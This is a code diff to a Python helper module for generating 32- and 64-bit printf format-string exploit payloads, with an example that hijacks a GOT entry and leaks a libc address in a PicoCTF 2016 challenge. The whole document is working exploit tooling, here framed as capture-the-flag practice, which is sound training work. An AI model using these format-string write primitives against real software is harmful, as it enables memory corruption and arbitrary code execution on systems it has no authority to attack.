@@ -1,4 +1,5 @@
-from rxpwn import *
+import re
+from struct import pack, unpack
 
 def pack_printf_32(fmt, addrs, buf_offset=0):
     ''' Pack a (parameterized) format string with a set of addresses into a printf buffer.
@@ -15,7 +16,7 @@ def pack_printf_32(fmt, addrs, buf_offset=0):
         return res
     fmt = re.sub(r'%..\$', replace, fmt)
     fmt = fmt.ljust((addr_start * 4 - buf_offset), '\0')
-    return fmt + pQ(*addrs)
+    return fmt + pack('<%dI' % len(addrs), *addrs)
 
 def pack_printf_64(fmt, addrs, buf_offset=0):
     ''' Pack a (parameterized) format string with a set of addresses into a printf buffer.
@@ -32,7 +33,7 @@ def pack_printf_64(fmt, addrs, buf_offset=0):
         return res
     fmt = re.sub(r'%..\$', replace, fmt)
     fmt = fmt.ljust((addr_start * 8 - buf_offset), '\0')
-    return fmt + pQ(*addrs)
+    return fmt + pack('<%dQ' % len(addrs), *addrs)
 
 def fmt_writes(writes, out_offset=0):
     ''' Create (fmt, addrs) pair for the given set of writes.
@@ -65,19 +66,19 @@ def gen_writes(addr, data):
     for i in xrange(0, len(data), 2):
         chunk = data[i:i+2]
         if len(chunk) == 1:
-            writes.append((addr+i, uB(chunk), 1))
+            writes.append((addr+i, unpack('<B', chunk)[0], 1))
         else:
-            writes.append((addr+i, uH(chunk), 2))
+            writes.append((addr+i, unpack('<H', chunk)[0], 2))
     return writes
 
 if __name__ == '__main__':
     # example usage (PicoCTF2016/pwn150-cfgconsole)
 
-    writes = gen_writes(0x601258, pQ(0x4009bd)[:6]) # exit -> loop
-    fmt, addrs = fmt_writes_64(writes, 6) # account for leak
+    writes = gen_writes(0x601258, pack('<Q', 0x4009bd)[:6]) # exit -> loop
+    fmt, addrs = fmt_writes(writes, 6) # account for leak
     # leak address of __libc_start_main
     fmt = '%XX$s' + fmt
     addrs = [0x601228] + addrs
-    payload = pack_printf(fmt, addrs, 72 + 5) # account for esi, ... registers, stack offset, and "exit "
+    payload = pack_printf_64(fmt, addrs, 72 + 5) # account for esi, ... registers, stack offset, and "exit "
 
-    pr('exit ' + payload)
+    print('exit ' + payload)
